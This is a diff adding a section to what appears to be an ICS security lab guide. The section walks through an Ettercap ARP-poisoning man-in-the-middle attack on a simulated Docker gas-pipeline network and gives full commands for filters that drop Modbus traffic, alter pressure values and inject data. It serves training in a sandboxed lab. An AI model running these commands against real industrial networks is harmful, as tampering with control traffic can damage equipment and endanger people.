@@ -381,6 +381,86 @@ Nmap is an open source network discovery and audit tool used by network admins t
 
 ## Step 1: MITM Setup and Install ettercap
 
+Ettercap is a comprehensive suite for man-in-the-middle (MITM) attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.
+
+<div align="center">Running a MITM container and installing Ettercap. Start Gas Pipeline containers. Verify Docker containers are running using sudo docker ps. Enable the Gas Pipeline data source</div>
+<p align="center"><img src=images/Picture92.jpg></p>
+<p align="center"><img src=images/Picture93.png></p>
+<p align="center"><img src=images/Picture94.png></p>
+<p align="center"><img src=images/Picture95.png></p>
+<p align="center"><img src=images/Picture96.jpg></p>
+<p align="center"><img src=images/Picture97.jpg></p>
+
+<div align="center">From a terminal on the VM, run sudo docker run -ti –net=plcnet –privileged –cap-add=NET_ADMIN –ip 100.100.100.5 –name mitm ubuntu:14.04 bash</div>
+<p align="center"><img src=images/Picture98.png></p>
+
+<div align="center">On the MITM container, run apt-get update && apt-get install ettercap-common p0f to update and install Ettercap on mitm container. Enter Y to continue when prompted</div>
+<p align="center"><img src=images/Picture99.png></p>
+
+## Step 2: Setting up the MITM attack
+
+<div align="center">On the MITM container, run ettercap -T -q -M arp:remote -i eth0 /100.100.100.2// /100.100.100.4//& (This sets up the ARP poisoning and the “&” makes it run in the background)</div>
+<p align="center"><img src=images/Picture100.png></p>
+
+<div align="center">Run jobs to see the status of the ettercap jobs/process running in the background</div>
+<p align="center"><img src=images/Picture101.png></p>
+
+<div align="center">Run echo 1 > /proc/sys/net/ipv4/ip_forward to forward the IPv4 traffic</div>
+<p align="center"><img src=images/Picture102.png></p>
+
+<div align="center">Run fg 1 to bring a background process to the foreground and take control of background process running ettercap</div>
+<p align="center"><img src=images/Picture103.png></p>
+
+<div align="center">Open Wireshark and notice the Retransmissions occurring while the MITM attack is ongoing</div>
+<p align="center"><img src=images/Picture104.jpg></p>
+
+## Step 3: Use Ettercap Filter to drop traffic
+
+<div align="center">Copy the dropmodbustraffic.filter from the lab4 folder to the MITM container. From the terminal, navigate to the lab4 folder and run: sudo docker cp dropmodbustraffic.filter mitm:/dropmodbustraffic.filter</div>
+<p align="center"><img src=images/Picture105.png></p>
+
+<div align="center">In the mitm container, run etterfilter dropmodbustraffic.filter -o dropmodbustraffic.ef on the MITM container</div>
+<p align="center"><img src=images/Picture106.png></p>
+
+<div align="center">Run ettercap -T -q -F dropmodbustraffic.ef -M arp:remote -I eth0 /100.100.100.2// /100.100.100.4//&</div>
+<p align="center"><img src=images/Picture107.png></p>
+
+<div align="center">You should see the message “MODBUS TRAFFIC FOUND -> DROPPED MODBUS TRAFFIC” as the packets are found and dropped</div>
+<p align="center"><img src=images/Picture108.png></p>
+
+## Step 4: Use Ettercap filter to change Gas Pipeline Value
+
+<div align="center">Copy the changepressure.filter from the lab4 folder to the MITM container. From the terminal, navigate to the lab4 folder and run: sudo docker cp change_pressure.filter mitm:/change_pressure.filter</div>
+<p align="center"><img src=images/Picture109.png></p>
+
+<div align="center">In the mitm container, run etterfilter change_pressure.filter -o change_pressure.ef on the MITM container</div>
+<p align="center"><img src=images/Picture110.png></p>
+
+<div align="center">Run ettercap -T -q -F change_pressure.ef -M arp:remote -I eth0 /100.100.100.2// /100.100.100.4//&</div>
+<p align="center"><img src=images/Picture111.png></p>
+
+<div align="center">Run echo 1 > /proc/sys/net/ipv4/ip_forward to forward the IPv4 traffic</div>
+<p align="center"><img src=images/Picture112.png></p>
+
+<div align="center">You should see the message “data changed” as the packets are discovered, and data injected</div>
+<p align="center"><img src=images/Picture113.png></p>
+
+## Step 5: Use Ettercap filter to Alter Gas Pipeline traffic
+
+<div align="center">Copy the stuxnet.filter from the lab4 folder to the MITM container. From the terminal, navigate to the lab4 folder and run: sudo docker cp stuxnet.filter mitm:/stuxnet.filter</div>
+<p align="center"><img src=images/Picture114.png></p>
+
+<div align="center">In the mitm container, run etterfilter stuxnet.filter -o stuxnet.ef on the MITM container</div>
+<p align="center"><img src=images/Picture115.png></p>
+
+<div align="center">Run ettercap -T -q -F stuxnet.ef -M arp:remote -i eth0 /100.100.100.2// /100.100.100.4//&</div>
+<p align="center"><img src=images/Picture116.png></p>
+
+<div align="center">Run echo 1 > /proc/sys/net/ipv4/ip_forward to forward the IPv4 traffic. You should see the messages “data injected” OR “data injected again” as the packets are altered, and data injected</div>
+<p align="center"><img src=images/Picture117.png></p>
+
+---
+
 
 
 
